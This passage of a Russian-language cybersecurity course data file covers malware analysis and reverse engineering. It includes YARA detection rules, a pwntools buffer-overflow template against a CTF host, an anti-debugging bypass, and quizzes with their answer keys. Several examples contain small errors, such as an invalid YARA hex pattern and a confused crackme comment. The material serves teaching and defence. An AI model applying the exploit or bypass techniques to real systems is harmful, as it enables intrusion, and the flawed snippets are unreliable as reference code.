Настоящий APT — это не один инструмент. Это цепочка: Initial Access (фишинг/эксплойт) → Persistence (регистр/задача) → Privilege Escalation → Credential Dumping → Lateral Movement → C2 → Exfil.

**Руткиты — самое сложное**
- **User-mode руткит** — хукает API (CreateToolhelp32Snapshot скрывает процессы)
- **Kernel-mode руткит** — модифицирует ядро ОС (DKOM — Direct Kernel Object Manipulation)
- **Bootkit** — заражает MBR или UEFI, загружается до ОС
- **Hypervisor rootkit** — переводит ОС в виртуальную машину под своим контролем`,
        codeExample: `# Базовые команды анализа подозрительного файла
file malware.exe           # тип файла
md5sum malware.exe         # MD5 хэш для проверки на VirusTotal
sha256sum malware.exe      # SHA256

# strings — извлечение ASCII/Unicode строк
strings -a malware.exe | head -100
strings -el malware.exe   # Unicode (wide strings)

# Проверка на VirusTotal через API
curl -s "https://www.virustotal.com/vtapi/v2/file/report" \
  --data "apikey=YOUR_KEY&resource=SHA256_HASH"`
      },
      {
        id: 'sec-5-2',
        title: 'Статический анализ',
        keyPoints: [
          'PE-формат: MZ header, PE header, секции .text/.data/.rsrc',
          'Import Table — какие WinAPI функции вызывает малварь',
          'Высокая энтропия секции → упаковка/шифрование (packed malware)',
          'YARA — язык правил для сигнатурного обнаружения'
        ],
        content: `**PE-формат (Portable Executable)**
Формат исполняемых файлов Windows (.exe, .dll, .sys).

Структура PE:
\`MZ Header\` → \`PE Header\` → \`Optional Header\` → \`Section Table\` → Секции

**Ключевые секции:**
- **.text** — исполняемый код
- **.data** — инициализированные данные
- **.rdata** — константы, строки
- **.rsrc** — ресурсы (иконки, диалоги)
- **.idata** — Import Address Table (IAT)

**Import Table — лучший индикатор поведения**
Малварь не может скрыть API-вызовы (без хукинга). Примеры подозрительных импортов:

| Функция | Что делает |
|---------|-----------|
| CreateRemoteThread | Инъекция кода в другой процесс |
| WriteProcessMemory | Запись в память другого процесса |
| VirtualAllocEx | Выделение памяти в другом процессе |
| RegSetValueEx | Запись в реестр (persistence) |
| WinExec / ShellExecute | Запуск команд |
| InternetOpen / HttpSendRequest | Сетевая активность |
| CryptEncrypt | Шифрование (ransomware?) |

**Энтропия**
Случайные данные имеют высокую энтропию (близко к 8 бит/байт). Секция с энтропией >7.0 → вероятно упакована или зашифрована. Инструменты: Die (Detect-It-Easy), PEiD, ExeinfoPE.

**YARA**
Язык для написания сигнатур малвари. Используется в Касперском, ESET, VirusTotal.`,
        codeExample: `# YARA rule — пример правила для обнаружения
rule SuspiciousRAT {
    meta:
        description = "Generic RAT detection"
        author = "RedChild"
    strings:
        $s1 = "keylogger" nocase
        $s2 = "screenshot" nocase
        $api1 = "GetAsyncKeyState"
        $api2 = "CreateRemoteThread"
    condition:
        2 of ($s*) and 1 of ($api*)
}

# Запуск YARA
yara -r rule.yar /path/to/scan/

# Изучение PE структуры
objdump -x malware.exe          # Linux (wine/mingw)
dumpbin /imports malware.exe    # Windows Visual Studio

# Detect-It-Easy (DIE) — GUI инструмент для определения packer/compiler
die malware.exe`
      },
      {
        id: 'sec-5-3',
        title: 'Динамический анализ и песочницы',
        keyPoints: [
          'Динамический анализ — запуск малвари в контролируемой среде',
          'Sandbox: Cuckoo, ANY.RUN, Joe Sandbox — автоматические отчёты',
          'Process Monitor (ProcMon) — все системные вызовы в реальном времени',
          'Regshot — снимок реестра до/после запуска'
        ],
        content: `**Зачем динамический анализ?**
Статика не всегда даёт ответы: малварь может быть упакована, использовать runtime-расшифровку, полиморфизм. Динамика показывает реальное поведение.

**Подготовка лаборатории**
⚠️ Никогда не запускай малварь на рабочей машине!
- VMware / VirtualBox — изолированная ВМ
- Сетевой интерфейс: Host-Only или NAT с FakeNet-NG
- Snapshot до запуска — быстрый откат
- FlareVM (Windows) или REMnux (Linux) — готовые аналитические дистрибутивы

**Инструменты для Windows**

📊 **Process Monitor (ProcMon)** — Sysinternals. Перехватывает:
- Файловые операции (создание, удаление, изменение)
- Операции с реестром
- Сетевые соединения
- Создание процессов

📊 **Process Hacker** — продвинутый диспетчер задач. Показывает: дерево процессов, открытые хэндлы, карту памяти, строки в памяти процесса.

📊 **Regshot** — делает snapshot реестра до и после запуска малвари, сравнивает изменения. Показывает ключи persistence.

📊 **Wireshark / FakeNet-NG** — анализ сетевых соединений. FakeNet имитирует DNS, HTTP, C2-серверы.

**Автоматические песочницы**
- **ANY.RUN** (any.run) — интерактивный онлайн-sandbox, бесплатный базовый план
- **Cuckoo Sandbox** — опенсорс, разворачивается локально
- **VirusTotal** — кроме антивируса даёт поведенческий анализ

**Что ищем в отчёте:**
- Новые файлы в %APPDATA%, %TEMP%, %SystemRoot%
- Ключи автозапуска в реестре: HKCU\\Run, HKLM\\Run
- DNS-запросы (C2 домены), HTTP-запросы
- Создание дочерних процессов (cmd.exe, powershell.exe)`,
        codeExample: `# Настройка FakeNet-NG для перехвата C2 трафика
fakenet-ng.py -l fakenet.log

# Sysinternals инструменты (Windows)
# Autoruns — все точки автозапуска
# TCPView — активные сетевые соединения
# strings.exe — извлечение строк (официальный аналог)

# Volatility — forensics памяти (дамп RAM)
volatility -f memory.dmp --profile=Win10x64 pslist
volatility -f memory.dmp --profile=Win10x64 netscan
volatility -f memory.dmp --profile=Win10x64 malfind   # подозрительные области памяти

# REMnux команды
pescanner malware.exe     # анализ PE
pdf-parser.py malware.pdf # анализ PDF`
      },
      {
        id: 'sec-5-4',
        title: 'IoC, YARA и атрибуция',
        keyPoints: [
          'IoC (Indicator of Compromise) — технические артефакты компрометации',
          'Типы IoC: хэши, IP/домены, mutex-имена, пути файлов, User-Agent строки',
          'STIX/TAXII — стандарты для обмена threat intelligence',
          'Атрибуция: TTPs уникальнее хэшей (малварь меняют, привычки — нет)'
        ],
        content: `**IoC — индикаторы компрометации**
IoC — это технические артефакты, указывающие на факт атаки. Используются для: обнаружения, ретроспективного анализа, обмена данными между командами.

**Пирамида боли (Pyramid of Pain)**
Концепция David Bianco: чем сложнее атакующему менять IoC, тем "болезненнее" его обнаружение.

| Уровень | Тип IoC | Боль для атакующего |
|---------|---------|---------------------|
| 1 (легко) | Хэши файлов | Тривиально изменить |
| 2 | IP-адреса | Легко поменять |
| 3 | Домены | Немного сложнее |
| 4 | Network artifacts | Сложнее |
| 5 | Host artifacts | Сложно |
| 6 (сложно) | TTPs (тактики) | Очень болезненно |

**Mutex — недооценённый IoC**
Малварь создаёт mutex, чтобы не запускаться дважды. Mutex-имена часто уникальны и не меняются между версиями.

**YARA — продвинутые техники**
- Wildcards: \`{ 6A ?? 68 ?? ?? ?? ?? }\` — соответствует любому байту на месте ??
- Счётчики: \`#s1 > 5\` — строка встречается > 5 раз
- Смещения: \`$s1 at 0\` — строка в начале файла
- Размер: \`filesize < 500KB\`

**STIX/TAXII**
- **STIX** — язык описания угроз (JSON-формат)
- **TAXII** — протокол обмена STIX-данными между организациями
- Kaspersky OpenTIP, MISP, AlienVault OTX — платформы для обмена

**Атрибуция APT**
Kaspersky GReAT атрибутирует группировки по: коду малвари, инфраструктуре, TTPs, временным паттернам (timezone), языку в строках/ошибках. TTPs (по MITRE ATT&CK) — самый надёжный признак.`,
        codeExample: `# Расширенное YARA правило
rule APT_Lazarus_Loader {
    meta:
        author = "GReAT"
        family = "Lazarus"
    strings:
        $mutex = "\\\\BaseNamedObjects\\\\TempMutex" wide
        $pdb   = "c:\\\\dev\\\\loader" nocase
        $xor   = { 8B ?? ?? XOR ?? ?? 89 ?? }  // XOR loop
    condition:
        uint16(0) == 0x5A4D and  // MZ header
        filesize < 2MB and
        any of them
}

# Извлечение IoC из PCAP
tshark -r capture.pcap -Y 'http' -T fields \
  -e ip.dst -e http.host -e http.request.uri | sort | uniq

# MISP — open source threat intelligence platform
# Интеграция с Snort для автоматической блокировки IoC`
      }
    ],
    quiz: [
      {
        id: 'q5-1',
        question: 'Чем червь (worm) отличается от вируса?',
        options: [
          'Червь шифрует файлы, вирус — нет',
          'Червь самостоятельно распространяется по сети без заражения файлов',
          'Вирус опаснее червя',
          'Червь работает только в Windows, вирус — в любой ОС'
        ],
        correctIndex: 1,
        explanation: 'Вирус прикрепляется к файлам и распространяется через их копирование. Червь самостоятельно распространяется по сети, используя уязвимости (WannaCry использовал EternalBlue/SMB). Для червя не нужно участие пользователя.',
        difficulty: 'easy'
      },
      {
        id: 'q5-2',
        question: 'Что указывает на то, что секция PE-файла упакована/зашифрована?',
        options: [
          'Маленький размер файла',
          'Высокая энтропия секции (>7.0 бит/байт)',
          'Отсутствие иконки',
          'Наличие секции .text'
        ],
        correctIndex: 1,
        explanation: 'Энтропия измеряет случайность данных. Нормальный код имеет энтропию ~6 бит/байт. Упакованные или зашифрованные данные близки к максимуму — 8 бит/байт. Инструменты DIE, PEiD используют это для определения паковщиков.',
        difficulty: 'medium'
      },
      {
        id: 'q5-3',
        question: 'Функция CreateRemoteThread в Import Table малвари говорит о чём?',
        options: [
          'Малварь создаёт многопоточные вычисления',
          'Малварь может инжектировать код в другой процесс',
          'Малварь использует удалённые серверы',
          'Малварь мониторит сетевые соединения'
        ],
        correctIndex: 1,
        explanation: 'CreateRemoteThread + WriteProcessMemory + VirtualAllocEx — классическая триада process injection. Малварь пишет payload в память другого процесса (например, svchost.exe) и запускает там поток, скрывая своё присутствие.',
        difficulty: 'hard'
      },
      {
        id: 'q5-4',
        question: 'В чём ценность mutex-имени как IoC?',
        options: [
          'Mutex легко найти в трафике',
          'Mutex-имена уникальны для семейства малвари и редко меняются между версиями',
          'Mutex содержит IP-адрес C2',
          'Mutex всегда зашифрован'
        ],
        correctIndex: 1,
        explanation: 'Хэш малвари меняется при перекомпиляции. Mutex — логическая константа, часто остаётся между версиями. Это ценный устойчивый IoC. Kaspersky и другие AV используют mutex в сигнатурах.',
        difficulty: 'hard'
      },
      {
        id: 'q5-5',
        question: 'Что такое "двойное вымогательство" в контексте ransomware?',
        options: [
          'Заражение двух ПК одновременно',
          'Требование выкупа дважды от одной жертвы',
          'Кража данных ДО шифрования + угроза публикации если не заплатят',
          'Шифрование файлов двумя разными алгоритмами'
        ],
        correctIndex: 2,
        explanation: 'Современные группировки (REvil, DarkSide) сначала крадут данные (exfiltration), потом шифруют. Жертва давится с двух сторон: плати за ключ расшифровки и за то, чтобы данные не утекли в публику.',
        difficulty: 'medium'
      },
      {
        id: 'q5-6',
        question: 'ANY.RUN и Cuckoo Sandbox — это инструменты для:',
        options: [
          'Написания exploit для CVE',
          'Автоматического динамического анализа малвари в изолированной среде',
          'Статического анализа PE-формата',
          'Сканирования сети на уязвимости'
        ],
        correctIndex: 1,
        explanation: 'Sandbox автоматически запускает файл в виртуальной среде, перехватывает все системные вызовы, сетевые запросы, изменения в файловой системе и реестре, и генерирует отчёт. Быстро получить поведенческую картину без ручного анализа.',
        difficulty: 'easy'
      },
      {
        id: 'q5-7',
        question: 'Согласно Pyramid of Pain, какой тип IoC самый болезненный для атакующего?',
        options: ['Хэши файлов', 'IP-адреса', 'TTPs (тактики, техники, процедуры)', 'Доменные имена'],
        correctIndex: 2,
        explanation: 'Хэши — тривиально изменить (1 бит). IP/домены — сменить сервер. TTPs — манера атаковать, инструменты, последовательность действий. Изменить TTPs — переобучить всю команду, сменить инфраструктуру. Поэтому MITRE ATT&CK фокусируется на TTPs.',
        difficulty: 'medium'
      },
      {
        id: 'q5-8',
        question: 'Kernel-mode руткит опаснее user-mode, потому что:',
        options: [
          'Занимает больше оперативной памяти',
          'Работает на уровне ядра ОС, может скрывать себя от любых user-mode инструментов',
          'Лучше шифрует данные',
          'Распространяется быстрее по сети'
        ],
        correctIndex: 1,
        explanation: 'User-mode руткит хукает API функции, которые используют инструменты анализа — можно обойти. Kernel-mode руткит работает с привилегиями ядра (ring 0), может модифицировать сами структуры ОС (DKOM) и скрываться от любых user-mode процессов. Обнаружение требует специальных kernel-level инструментов или анализа дампа памяти.',
        difficulty: 'hard'
      }
    ]
  },

  // ── MODULE 6 ────────────────────────────────────────────────────────────
  {
    id: 'mod-06',
    title: 'Реверс-инжиниринг',
    subtitle: 'Reverse Engineering',
    description:
      'x86/x64 ассемблер, разборка бинарных файлов, патчинг, CTF challenges.',
    icon: '⚙️',
    color: '#440008',
    xpReward: 500,
    estimatedTime: '~120 мин',
    prerequisites: ['mod-05'],
    tags: ['reverse', 'assembly', 'x64', 'CTF'],
    theory: [
      {
        id: 'sec-6-1',
        title: 'x86/x64 ассемблер — основы',
        keyPoints: [
          'Регистры: RAX/EAX (результат), RSP (стек), RBP (стек-фрейм), RIP (счётчик команд)',
          'MOV, PUSH/POP, CALL/RET, JMP/JE/JNE — основные инструкции',
          'Стек растёт ВНИЗ: PUSH уменьшает RSP, POP увеличивает',
          'CALL = PUSH RIP + JMP; RET = POP RIP'
        ],
        content: `**Почему ассемблер нужен безопаснику**
Малварь, эксплойты, crackme — всё это в итоге ассемблер. Без его понимания реверс невозможен.

**Регистры x64**

| Регистр | 64-бит | 32-бит | Назначение |
|---------|--------|--------|-----------|
| Accumulator | RAX | EAX | Возвращаемое значение, арифметика |
| Base | RBX | EBX | Общего назначения |
| Counter | RCX | ECX | Первый аргумент (Windows x64) |
| Data | RDX | EDX | Второй аргумент |
| Source | RSI | ESI | Источник (строковые операции) |
| Destination | RDI | EDI | Назначение |
| Stack Ptr | RSP | ESP | Вершина стека |
| Base Ptr | RBP | EBP | Основание стека-фрейма |
| Instr Ptr | RIP | EIP | Текущая инструкция |

**Основные инструкции**
- \`MOV rax, 1\` — загрузить 1 в RAX
- \`MOV rax, [rbp-8]\` — загрузить из памяти по адресу (разыменование)
- \`ADD rax, rbx\` — RAX = RAX + RBX
- \`CMP rax, 0\` — сравнение (не меняет регистры, только флаги)
- \`JE addr\` — прыжок если Zero Flag = 1 (равно)
- \`JNE addr\` — прыжок если не равно
- \`PUSH rax\` — RSP -= 8, [RSP] = RAX
- \`POP rbx\` — RBX = [RSP], RSP += 8

**Функции и стек-фрейм**
\`\`\`nasm
function:
    push rbp          ; сохранить старый базовый указатель
    mov rbp, rsp      ; установить новый стек-фрейм
    sub rsp, 32       ; выделить место для локальных переменных
    ; ... тело функции ...
    mov rsp, rbp      ; восстановить стек
    pop rbp
    ret               ; вернуться (POP RIP)
\`\`\`

**Calling Convention (x64 System V — Linux)**
Аргументы передаются в регистрах: RDI, RSI, RDX, RCX, R8, R9. Остальные — через стек. Результат — в RAX.

**Windows x64:** RCX, RDX, R8, R9.`,
        codeExample: `; Простой crackme на ассемблере — найди пароль
section .data
    correct db "Correct!", 0
    wrong   db "Wrong!", 0

section .text
global main
main:
    ; Предположим, пользователь ввёл строку в RDI
    mov rax, [rdi]         ; первые 8 байт ввода
    cmp rax, 0x6B63756478  ; сравниваем с "xduck" (little-endian)
    je .correct
    ; Задача реверсера: понять что сравниваем
    ; 0x6B63756478 -> hex to ASCII -> "xduck k" -> read backwards

.correct:
    lea rdi, [correct]
    call puts
    ret`
      },
      {
        id: 'sec-6-2',
        title: 'Ghidra и IDA — инструменты реверса',
        keyPoints: [
          'Ghidra (NSA, бесплатный) — дизассемблер + декомпилятор',
          'IDA Pro (платный) — стандарт индустрии, IDA Free — для некоммерческого',
          'Декомпилятор преобразует asm → псевдо-C (не идеально, но читаемо)',
          'Переименование функций и переменных — ключ к пониманию кода'
        ],
        content: `**Дизассемблирование vs Декомпиляция**
- **Дизассемблирование** — бинарный код → инструкции ассемблера
- **Декомпиляция** — инструкции ассемблера → псевдо-C (приближение к оригиналу)

Декомпилятор не даёт исходник — он даёт семантически эквивалентный псевдокод. Имена переменных теряются при компиляции.

**Ghidra — рабочий процесс**
1. File → Import File → загрузить бинарник
2. Analyze (автоанализ: ~1-5 мин для малых файлов)
3. Слева — Symbol Tree (функции, строки, импорты)
4. Центр — Listing (ассемблер)
5. Справа — Decompiler (псевдо-C)
6. Правая кнопка → Rename Function/Variable

**Ключевые техники в Ghidra:**
- **Search → For Strings** — найти все строки в бинаре
- **XREF (Cross-references)** — кто вызывает эту функцию
- **Bookmarks** — пометить важные места
- **Patch** — изменить инструкции (например, JNE → JMP для обхода проверки)

**IDA Free — отличия**
IDA — де-факто стандарт в индустрии. IDA Free бесплатна для некоммерческого использования, но поддерживает только x86/x64/ARM.
- **F5** — открыть декомпилятор (Hex-Rays)
- **N** — переименовать
- **;** — добавить комментарий
- **G** — перейти по адресу

**Быстрый старт: crackme**
1. Найди функцию \`main\` или \`WinMain\`
2. Найди строки "correct"/"wrong"/"success" через String search
3. Перейди к XREF — найдёшь функцию проверки
4. Проанализируй логику → найди пароль/ключ`,
        codeExample: `# Установка и запуск Ghidra
# Скачать с ghidra-sre.org
java -jar ghidraRun.jar  # требует Java 17+

# radare2 — CLI альтернатива
r2 malware.exe
> aaa          # автоанализ
> afl          # список функций
> s main       # перейти к main
> pdf          # дизассемблировать текущую функцию
> VV           # граф вызовов

# objdump — быстрый просмотр
objdump -d -M intel binary | head -100

# Проверить импорты ELF
readelf -d binary | grep NEEDED
nm -D binary   # динамические символы`
      },
      {
        id: 'sec-6-3',
        title: 'Отладка: GDB, x64dbg, WinDbg',
        keyPoints: [
          'Отладчик = выполнение программы под контролем аналитика',
          'Breakpoint — остановить программу в определённой точке',
          'Step into (F7) vs Step over (F8) — войти в функцию или перешагнуть',
          'Anti-debug: IsDebuggerPresent, timing checks, PTRACE_TRACEME'
        ],
        content: `**Отладка vs Статический анализ**
Отладка выполняет программу. Плюсы: видишь реальные значения в регистрах/памяти, расшифровка зашифрованных строк, обход сложных проверок. Минусы: малварь может обнаружить отладчик и изменить поведение.

**GDB — отладчик Linux**
Мощный CLI-отладчик. С расширением PEDA/GEF/pwndbg — стандарт для binary exploitation.

**Основные команды GDB:**
- \`break main\` — breakpoint на функцию main
- \`break *0x400080\` — breakpoint по адресу
- \`run\` — запустить программу
- \`continue\` — продолжить до следующего breakpoint
- \`next\` (n) — step over
- \`step\` (s) — step into
- \`info registers\` — состояние регистров
- \`x/10x $rsp\` — 10 слов из стека
- \`disassemble main\` — asm функции

**x64dbg — отладчик Windows**
Бесплатный, открытый отладчик для Windows x32/x64. Очень удобный GUI.
- Вкладки: CPU, Log, Breakpoints, Memory Map
- F2 — поставить breakpoint
- F7 — step into, F8 — step over, F9 — run

**Anti-Debugging техники**
Малварь активно защищается от анализа:

| Техника | Описание |
|---------|----------|
| IsDebuggerPresent | WinAPI: возвращает 1 если отлаживается |
| CheckRemoteDebugger | Более надёжная проверка |
| Timing check | RDTSC: в отладчике код выполняется медленнее |
| INT 3 / INT 0x2D | Исключение — в отладчике обработается иначе |
| PTRACE (Linux) | Процесс может быть только под одним ptrace |
| TLS Callbacks | Код до main() — до того как отладчик ставит breakpoints |

**Обход:** патчить IsDebuggerPresent → ret 0, плагин ScyllaHide для x64dbg.`,
        codeExample: `# GDB с PEDA — binary exploitation
gdb ./vulnerable_binary

# GDB команды:
(gdb) break main
(gdb) run <<< $(python3 -c "print('A'*100)")
(gdb) info registers rsp rip rbp
(gdb) x/20x $rsp   # дамп стека
(gdb) backtrace     # стек вызовов

# Патчинг IsDebuggerPresent в x64dbg
# Найти вызов: call <IsDebuggerPresent>
# Следующая инструкция: test eax, eax
# Изменить на: xor eax, eax (всегда 0 = не в отладчике)

# strace (Linux) — системные вызовы
strace -e trace=openat,read,write ./binary

# ltrace — вызовы библиотечных функций
ltrace ./binary`
      },
      {
        id: 'sec-6-4',
        title: 'CTF и бинарная эксплуатация',
        keyPoints: [
          'CTF (Capture The Flag) — соревнования: pwn, rev, web, crypto, forensics',
          'Buffer overflow: переполнение буфера → контроль над RIP',
          'ROP (Return-Oriented Programming) — цепочки из гаджетов в легитимном коде',
          'pwntools — Python библиотека для автоматизации exploit-разработки'
        ],
        content: `**CTF — лучший способ прокачать навыки**
CTF (Capture The Flag) — соревнования, где нужно найти скрытый флаг (текстовую строку). Форматы:

| Категория | Описание |
|-----------|----------|
| **pwn** | Бинарная эксплуатация: buffer overflow, heap |
| **rev** | Реверс-инжиниринг: найти логику, взломать защиту |
| **web** | Веб-уязвимости: SQLi, XSS, IDOR |
| **crypto** | Атаки на криптографию |
| **forensics** | Анализ дампов, steganography |
| **misc** | Всё остальное |

**Платформы:**
- **HackTheBox** (hackthebox.com) — реалистичные машины и вызовы
- **TryHackMe** (tryhackme.com) — обучение + практика, хорошо для начала
- **picoCTF** — для начинающих, задачи от Carnegie Mellon
- **pwn.college** — бесплатный курс binary exploitation

**Stack Buffer Overflow**
Классика: функция копирует ввод в буфер без проверки размера.
\`\`\`c
char buf[64];
gets(buf);  // ОПАСНО! gets не проверяет длину
\`\`\`
Если ввести >64 байт, переполнение перезапишет saved RBP → saved RIP. Контролируя RIP, контролируем что выполнится после ret.

**ROP (Return-Oriented Programming)**
Современные защиты (NX/DEP) запрещают выполнение кода на стеке. ROP обходит это: собирает "гаджеты" — короткие последовательности инструкций из самого бинарника, заканчивающиеся на \`ret\`. Цепочка гаджетов = произвольный код без нового шелл-кода.

**Защиты и их обход:**
| Защита | Что делает | Обход |
|--------|------------|-------|
| NX/DEP | Стек не исполняется | ROP |
| ASLR | Рандомизация адресов | Leak + ROP |
| Stack Canary | Случайное значение перед RIP | Leak canary |
| PIE | Рандомизация базы | Leak base |`,
        codeExample: `# pwntools — стандарт для CTF pwn задач
from pwn import *

# Подключение
p = process('./vulnerable')     # локально
p = remote('ctf.example.com', 1337)  # удалённо

# Отправка данных
p.sendline(b'input here')
p.recvuntil(b'>')   # читать до символа

# Buffer overflow: заполнить буфер + адрес победы
offset = 72  # найти через cyclic()
win_addr = 0x4011b2

payload = b'A' * offset
payload += p64(win_addr)  # little-endian 8 байт
p.sendline(payload)
p.interactive()

# ROPgadget — поиск гаджетов
ROPgadget --binary ./binary --rop
# pop rdi ; ret — для передачи аргументов в syscall

# checksec — проверить защиты бинарника
checksec --file=./binary
# Arch, RELRO, Stack Canary, NX, PIE, RPATH`
      },
      {
        id: 'sec-6-5',
        title: 'Деобфускация и анти-реверс техники',
        keyPoints: [
          'Packing (UPX, MPRESS) — сжатие + шифрование кода, распаковка при запуске',
          'Обфускация строк — XOR-шифрование строк в памяти',
          'Control flow obfuscation — мусорные прыжки, непрямые вызовы',
          'VM-обфускация (VMProtect, Themida) — перекодирует в собственный байткод'
        ],
        content: `**Почему обфускация мешает реверсу**
Малварь активно сопротивляется анализу. Понимание техник обфускации = понимание как их преодолеть.

**Packing (упаковка)**
Упакованный бинарник при запуске: распаковывает себя в память → передаёт управление настоящему коду.

Как опознать: высокая энтропия, минимальные импорты (LoadLibrary + GetProcAddress), одна маленькая секция с кодом.

**UPX** — самый популярный паковщик:
\`upx -d malware.exe\` — автораспаковка (если UPX не модифицирован).
Модифицированный UPX: нужно найти OEP (Original Entry Point) вручную → dump в правильный момент.

**Обфускация строк**
Вместо строки "http://evil.com" в бинаре — зашифрованные байты. При запуске — XOR/RC4 расшифровка.
Решение: поставить breakpoint на функцию дешифровки, посмотреть результат в памяти.

**Control Flow Obfuscation (CFO)**
- Indirect jumps: \`jmp [rax]\` вместо \`jmp 0x401000\` — Ghidra не строит граф
- Opaque predicates: условные прыжки, которые всегда идут в одну сторону, запутывают анализ
- Spurious code: мусорный код между реальными инструкциями

**VM-обфускация — самый сложный уровень**
VMProtect, Themida, Code Virtualizer преобразуют код в байткод собственной виртуальной машины. Реверс требует: понять архитектуру VM → написать дизассемблер для её байткода. Занимает дни/недели.

**Практические подходы:**
1. **Статика + динамика** — что не видно статически, покажет sandbox
2. **Поиск интересных строк в памяти** — после расшифровки строки видны
3. **API-мониторинг** — API не обфускируешь (функции всё равно вызываются)
4. **Unpacking по OEP** — найти Original Entry Point, сделать dump`,
        codeExample: `# Распаковка UPX
upx -d packed.exe -o unpacked.exe

# Если UPX модифицирован — найти OEP через x64dbg:
# 1. Поставить hardware BP на ESP при старте
# 2. Run → когда сработает BP, ESP = стек распакованного кода
# 3. Step несколько раз → JMP на OEP
# 4. Scylla plugin → Dump + Fix imports

# Поиск XOR-обфусцированных строк в памяти (Python + pwntools)
from pwn import *
data = open('section_data.bin', 'rb').read()
key = 0x37
decoded = bytes([b ^ key for b in data])
# Ищем читаемые строки в decoded

# x64dbg — Memory Search
# Ctrl+B → поиск паттерна в памяти
# Когда малварь расшифровала строки, ищем "http" / "C2" в heap

# FLOSS — FireEye Labs Obfuscated String Solver
floss malware.exe   # автоматически находит обфусцированные строки`
      }
    ],
    quiz: [
      {
        id: 'q6-1',
        question: 'Что хранится в регистре RIP?',
        options: [
          'Результат последней арифметической операции',
          'Адрес вершины стека',
          'Адрес следующей инструкции для выполнения',
          'Первый аргумент текущей функции'
        ],
        correctIndex: 2,
        explanation: 'RIP (Instruction Pointer) — счётчик команд. Указывает на следующую инструкцию для выполнения. Контроль над RIP = контроль над потоком выполнения. Именно поэтому buffer overflow нацелены на перезапись RIP (saved return address).',
        difficulty: 'easy'
      },
      {
        id: 'q6-2',
        question: 'Что происходит с RSP при выполнении PUSH rax?',
        options: [
          'RSP увеличивается на 8',
          'RSP уменьшается на 8, значение RAX записывается по адресу [RSP]',
          'RAX копируется в RSP',
          'RSP не изменяется'
        ],
        correctIndex: 1,
        explanation: 'Стек растёт в сторону меньших адресов. PUSH: RSP -= 8, [RSP] = значение. POP: значение = [RSP], RSP += 8. Это объясняет почему buffer overflow перезаписывает адрес возврата: он лежит выше буфера на стеке.',
        difficulty: 'medium'
      },
      {
        id: 'q6-3',
        question: 'Ghidra и IDA Pro — это инструменты для:',
        options: [
          'Сканирования сети',
          'Написания эксплойтов',
          'Статического анализа бинарного кода — дизассемблирование и декомпиляция',
          'Перехвата сетевого трафика'
        ],
        correctIndex: 2,
        explanation: 'Ghidra (от NSA, бесплатный) и IDA Pro (Hex-Rays, платный — стандарт индустрии) — дизассемблеры с декомпилятором. Превращают бинарный код в asm и псевдо-C. Основные инструменты реверс-инженера.',
        difficulty: 'easy'
      },
      {
        id: 'q6-4',
        question: 'Что такое ROP (Return-Oriented Programming)?',
        options: [
          'Техника программирования на ассемблере',
          'Обход NX/DEP путём создания цепочки из "гаджетов" — существующих инструкций в бинаре',
          'Метод обфускации строк в малваре',
          'Тип buffer overflow для 32-битных программ'
        ],
        correctIndex: 1,
        explanation: 'NX/DEP запрещает выполнение кода на стеке — шелл-код не сработает. ROP использует фрагменты ("гаджеты") легитимного кода бинарника, заканчивающиеся на RET. Цепочка гаджетов формирует нужную логику без нового исполняемого кода.',
        difficulty: 'hard'
      },
      {
        id: 'q6-5',
        question: 'Как пакеры типа UPX мешают статическому анализу?',
        options: [
          'Шифруют только импорты',
          'Сжимают и/или шифруют код, распаковывая его в памяти при запуске — в бинаре не видно настоящий код',
          'Удаляют строки из бинарника',
          'Меняют расширение файла'
        ],
        correctIndex: 1,
        explanation: 'Паковщик шифрует/сжимает оригинальный код. В файле виден только stub-распаковщик. Дизассемблер видит мусор. Решение: запустить до OEP (Original Entry Point) и сделать memory dump уже распакованного кода.',
        difficulty: 'medium'
      },
      {
        id: 'q6-6',
        question: 'pwntools — это:',
        options: [
          'GUI отладчик для Windows',
          'Расширение для Burp Suite',
          'Python библиотека для автоматизации разработки эксплойтов и CTF pwn задач',
          'Плагин для IDA Pro'
        ],
        correctIndex: 2,
        explanation: 'pwntools — стандарт в CTF pwn категории. Упрощает: подключение к процессу/серверу, отправку payload, парсинг адресов из вывода (для обхода ASLR), работу с форматами little/big endian. p64(addr), p.sendline(), p.interactive() — базовые операции.',
        difficulty: 'easy'
      },
      {
        id: 'q6-7',
        question: 'Зачем малварь использует IsDebuggerPresent?',
        options: [
          'Для оптимизации производительности',
          'Для обнаружения что программа запущена под отладчиком и изменения поведения',
          'Для проверки лицензии',
          'Для обнаружения антивируса'
        ],
        correctIndex: 1,
        explanation: 'IsDebuggerPresent — WinAPI функция, возвращающая 1 если процесс отлаживается. Малварь проверяет это и при обнаружении: выходит, показывает другое поведение, зависает. Обход: ScyllaHide плагин или патч функции на xor eax, eax / ret.',
        difficulty: 'medium'
      },
      {
        id: 'q6-8',
        question: 'HackTheBox и TryHackMe — это:',
        options: [
          'Компании по разработке антивирусов',
          'Онлайн-платформы для практики навыков кибербезопасности через CTF и реалистичные задания',
          'Базы данных уязвимостей',
          'Инструменты для сканирования сетей'
        ],
        correctIndex: 1,
        explanation: 'HackTheBox — реалистичные машины (Linux/Windows с уязвимостями), задачи по pwn/rev/web/crypto. TryHackMe — более обучающий формат, guided пути. Оба используются для прокачки навыков и демонстрации работодателям (в том числе Касперскому).',
        difficulty: 'easy'
      }
    ]
  }
]
